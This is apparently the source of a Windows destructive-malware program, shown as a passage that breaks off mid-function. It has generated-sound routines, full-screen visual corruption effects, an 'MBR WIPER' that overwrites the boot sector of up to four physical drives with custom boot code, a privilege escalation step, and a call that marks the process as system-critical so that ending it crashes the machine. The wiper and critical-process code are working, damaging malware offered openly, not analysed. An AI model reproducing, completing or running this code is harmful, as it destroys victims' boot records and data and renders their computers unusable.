// raznos_ultimate.cpp - ПОЛНАЯ ВЕРСИЯ С НОВЫМИ ЭФФЕКТАМИ
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0601
#define WINVER 0x0601

#include <Windows.h>
#include <tchar.h>
#include <windowsx.h>
#include <math.h>
#include <time.h>
#include <stdio.h>
#include <mmsystem.h>
#include <tlhelp32.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "advapi32.lib")

#define M_PI 3.14159265358979323846264338327950288
#define TOTAL_EFFECTS_TIME 383000  // 6 минут 20 секунд в миллисекундах

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct { FLOAT h; FLOAT s; FLOAT l; } HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed, g = rgb.rgbGreen, b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f, _g = (FLOAT)g / 255.f, _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT h = 0.f, s = 0.f, l = (rgbMax + rgbMin) / 2.f;
        if (fDelta != 0.f) {
            s = l < .5f ? fDelta / (rgbMax + rgbMin) : fDelta / (2.f - rgbMax - rgbMin);
            FLOAT deltaR = ((rgbMax - _r) / 6.f + fDelta / 2.f) / fDelta;
            FLOAT deltaG = ((rgbMax - _g) / 6.f + fDelta / 2.f) / fDelta;
            FLOAT deltaB = ((rgbMax - _b) / 6.f + fDelta / 2.f) / fDelta;
            if (_r == rgbMax) h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f) h += 1.f;
            if (h > 1.f) h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }
    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l, g = hsl.l, b = hsl.l;
        FLOAT h = hsl.h, sl = hsl.s, l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        if (v > 0.f) {
            FLOAT m = l + l - v;
            FLOAT sv = (v - m) / v;
            h *= 6.f;
            INT sextant = (INT)h;
            FLOAT fract = h - sextant;
            FLOAT vsf = v * sv * fract;
            FLOAT mid1 = m + vsf;
            FLOAT mid2 = v - vsf;
            switch (sextant) {
                case 0: r = v; g = mid1; b = m; break;
                case 1: r = mid2; g = v; b = m; break;
                case 2: r = m; g = v; b = mid1; break;
                case 3: r = m; g = mid2; b = v; break;
                case 4: r = mid1; g = m; b = v; break;
                case 5: r = v; g = m; b = mid2; break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int stage = 0, r = 0, g = 0, b = 0;

COLORREF Hue(int shift) {
    switch (stage) {
        case 0: r = 255; b = 0; g < 255 ? g += shift : stage++; break;
        case 1: g = 255; b = 0; r > 0 ? r -= shift : stage++; break;
        case 2: g = 255; r = 0; b < 255 ? b += shift : stage++; break;
        case 3: b = 255; r = 0; g > 0 ? g -= shift : stage++; break;
        case 4: b = 255; g = 0; r < 255 ? r += shift : stage++; break;
        case 5: r = 255; g = 0; b > 0 ? b -= shift : stage = 0; break;
    }
    return RGB(r, g, b);
}

// ==================== ЗВУКИ (ВСЕ ЭФФЕКТЫ) ====================

VOID WINAPI sound_crush() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ t >> 4) * (t >> 3) & (t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_glitch() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 0xFF) ^ (t >> 5) * (t & 0x1F));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_scan() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12000, 12000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[12000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 3) ^ (t >> 4) | (t & 0x3F));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_shatter() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 7) ^ (t >> 3) * (t & 0x0F) | (t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_pulse() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5) ^ (t >> 6) | (t & 0x7F) * (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_blast() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 20000, 20000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[20000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 9) ^ (t >> 5) * (t & 0x3F) | (t >> 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_demolish() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 11) ^ (t >> 2) | (t & 0x1F) * (t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_annihilate() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 13) ^ (t >> 7) | (t & 0x0F) * (t >> 5) | (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

// НОВЫЕ ЗВУКИ
VOID WINAPI sound_spin() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 18000, 18000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[18000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 7) ^ (t >> 4) | (t & 0x7F) * (t >> 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_squeeze() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 14000, 14000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[14000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 3) ^ (t >> 6) | (t & 0x3F) * (t >> 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_waterfall() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 10000, 10000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[10000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5) ^ (t >> 3) | (t & 0x1F) * (t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_sideways() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 13000, 13000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[13000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 11) ^ (t >> 5) | (t & 0x0F) * (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_explode() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 17) ^ (t >> 7) | (t & 0x7F) * (t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound_quake() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9000, 9000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 13) ^ (t >> 2) | (t & 0x3F) * (t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

// ==================== MBR WIPER (ОРИГИНАЛ) ====================

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    BYTE customMBR[512] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xBB, 
0x34, 0x12, 0x89, 0xD8, 0x35, 0xBF, 0x8E, 0x05, 0x5B, 0x63, 0xC1, 0xC0, 0x03, 0x31, 0xC8, 0x89, 
0xC3, 0x26, 0x88, 0x05, 0x47, 0xE2, 0xEB, 0xBB, 0x00, 0x00, 0xBE, 0x00, 0x00, 0x89, 0xF0, 0xD1, 
0xE8, 0xBA, 0x00, 0x00, 0xB9, 0x0A, 0x00, 0xF7, 0xF1, 0x89, 0xC5, 0xB9, 0x00, 0x00, 0x89, 0xC8, 
0xD1, 0xE0, 0x01, 0xF0, 0x25, 0x1F, 0x00, 0x89, 0xC2, 0xB8, 0x14, 0x00, 0xF7, 0xE2, 0xC1, 0xE8, 
0x05, 0x01, 0xE8, 0x89, 0xC2, 0x81, 0xFA, 0xC8, 0x00, 0x7D, 0x1A, 0x81, 0xFA, 0x00, 0x00, 0x7C, 
0x14, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x01, 0xC8, 0x89, 0xC7, 0xB0, 0x0F, 0x00, 0xC8, 
0x30, 0xD0, 0x26, 0x88, 0x05, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x7C, 0xC2, 0x46, 0x81, 0xFE, 0xC8, 
0x00, 0x7C, 0xAA, 0xBB, 0x00, 0x00, 0x89, 0xD8, 0x35, 0xAD, 0xDE, 0x25, 0x0F, 0x00, 0x05, 0x04, 
0x00, 0x89, 0xC6, 0x89, 0xD8, 0x35, 0xFE, 0xCA, 0x25, 0xFF, 0x01, 0x3D, 0x40, 0x01, 0x7D, 0x3B, 
0x89, 0xC7, 0x89, 0xD8, 0x35, 0xEF, 0xBE, 0x25, 0xFF, 0x00, 0x3D, 0xC8, 0x00, 0x7D, 0x2C, 0x89, 
0xC5, 0x53, 0x56, 0x51, 0x52, 0x89, 0xF9, 0x89, 0xEA, 0x89, 0xD0, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 
0x01, 0xC8, 0x89, 0xC7, 0x88, 0xD8, 0x00, 0xC8, 0x30, 0xD0, 0x26, 0x88, 0x05, 0x5A, 0x59, 0x41, 
0x39, 0xF1, 0x7C, 0xDF, 0x42, 0x39, 0xF2, 0x7C, 0xDA, 0x5E, 0x5B, 0x43, 0x81, 0xFB, 0x64, 0x00, 
0x7C, 0xA4, 0xB9, 0x00, 0xFA, 0xBF, 0x00, 0x00, 0x26, 0x8A, 0x05, 0x34, 0xFF, 0x26, 0x88, 0x05, 
0x47, 0xE2, 0xF5, 0xE9, 0x1C, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
    DWORD dwBytesWritten;
    for (int i = 0; i < 4; i++) {
        char path[32];
        sprintf(path, "\\\\.\\PhysicalDrive%d", i);
        HANDLE hDevice = CreateFileA(path, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
        if (hDevice != INVALID_HANDLE_VALUE) {
            WriteFile(hDevice, customMBR, 512, &dwBytesWritten, 0);
            CloseHandle(hDevice);
        }
    }
    return 1;
}

// ==================== ПРИВИЛЕГИИ ====================

BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueA(NULL, lpszPriv, &luid)) { CloseHandle(hToken); return FALSE; }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HMODULE hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL) {
        EnablePriv("SeDebugPrivilege");
        typedef VOID(_stdcall* RtlSetProcessIsCritical)(IN BOOLEAN, OUT PBOOLEAN, IN BOOLEAN);
        RtlSetProcessIsCritical fSetCritical = (RtlSetProcessIsCritical)GetProcAddress(hDLL, "RtlSetProcessIsCritical");
        if (fSetCritical) { fSetCritical(1, 0, 0); return 1; }
    }
    return 0;
}

void reg_add(HKEY HKey, LPCSTR Subkey, LPCSTR ValueName, unsigned long Type, unsigned int Value) {
    HKEY hKey; DWORD dwDisposition;
    RegCreateKeyExA(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, ValueName, 0, Type, (const unsigned char*)&Value, sizeof(Value));
    RegCloseKey(hKey);
}

// ==================== ОРИГИНАЛЬНЫЕ ЭФФЕКТЫ (БЕЗ ИЗМЕНЕНИЙ) ====================

// 1. RGB_HELL_DRIP
DWORD WINAPI rgb_hell_drip(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    int phase = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int idx = y * w + x;
                int drip = (int)((sin(x * 0.02f + phase * 0.01f) * 50 + 50) * (y / (float)h));
                int val = (x ^ y + phase + drip) % 255;
                rgbquad[idx].rgbRed = (rgbquad[idx].rgbRed + val + drip) % 255;
                rgbquad[idx].rgbGreen = (rgbquad[idx].rgbGreen + (val * 2) % 255 + drip/2) % 255;
                rgbquad[idx].rgbBlue = (rgbquad[idx].rgbBlue + (val * 3) % 255 + drip/3) % 255;
                if (drip > 70 && (x + y) % 5 == 0) {
                    rgbquad[idx].rgbRed = 255 - rgbquad[idx].rgbRed;
                    rgbquad[idx].rgbGreen = 255 - rgbquad[idx].rgbGreen;
                    rgbquad[idx].rgbBlue = 255 - rgbquad[idx].rgbBlue;
                }
            }
        }
        phase += 3;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(15);
    }
}

// 2. CHROMATIC_ABYSS
DWORD WINAPI chromatic_abyss(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = {0};
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
        for (int x = 0; x < sw; x++) {
            for (int y = 0; y < sh; y++) {
                int idx = y * sw + x;
                HSL hsl = Colors::rgb2hsl(rgbquad[idx]);
                int fx = (int)((i ^ 7) + (i * 3) * sin(x * 0.005f + y * 0.003f + i * 0.01f));
                hsl.h = fmod(hsl.h + fx / 500.f + y * 0.001f, 1.f);
                hsl.s = fmax(0.f, fmin(1.f, hsl.s + 0.1f * sin(x * 0.01f + i * 0.02f)));
                hsl.l = fmax(0.f, fmin(1.f, hsl.l + 0.05f * cos(y * 0.01f + i * 0.015f)));
                rgbquad[idx] = Colors::hsl2rgb(hsl);
                if ((x + y + i) % 7 == 0) {
                    rgbquad[idx].rgbRed = 255 - rgbquad[idx].rgbRed;
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(20);
    }
    return 0;
}

// 3. VERTEX_SHRED
DWORD WINAPI vertex_shred(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = {0};
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY);
        for (int x = 0; x < sw; x++) {
            for (int y = 0; y < sh; y++) {
                int idx = y * sw + x;
                HSL hsl = Colors::rgb2hsl(rgbquad[idx]);
                int fx = (int)((i ^ 5) + (i * 2) * (x ^ y) * sin(i * 0.005f));
                hsl.h = fmod(hsl.h + fx / 450.f + x * 0.002f, 1.f);
                hsl.s = fmax(0.f, fmin(1.f, hsl.s + 0.08f * cos(y * 0.015f + i * 0.025f)));
                hsl.l = fmax(0.f, fmin(1.f, hsl.l + 0.06f * sin(x * 0.012f + i * 0.02f)));
                rgbquad[idx] = Colors::hsl2rgb(hsl);
                if ((x * y + i) % 5 == 0) {
                    rgbquad[idx].rgbGreen = 255 - rgbquad[idx].rgbGreen;
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, sw, sh, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(18);
    }
    return 0;
}

// 4. SCANLINE_CORRUPT
DWORD WINAPI scanline_corrupt(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, sw, sh);
    SelectObject(mdc, bmp);
    while (1) {
        hdc = GetDC(NULL);
        BitBlt(mdc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < sh; y += 4) {
            int shift = (int)(15 * sin(y * 0.03f + GetTickCount() * 0.003f));
            BitBlt(hdc, shift, y, sw, 2, mdc, 0, y, SRCCOPY);
            BitBlt(hdc, -shift, y + 2, sw, 2, mdc, 0, y + 2, SRCPAINT);
        }
        for (int x = 0; x < sw; x += 30) {
            int vshift = (int)(10 * cos(x * 0.02f + GetTickCount() * 0.004f));
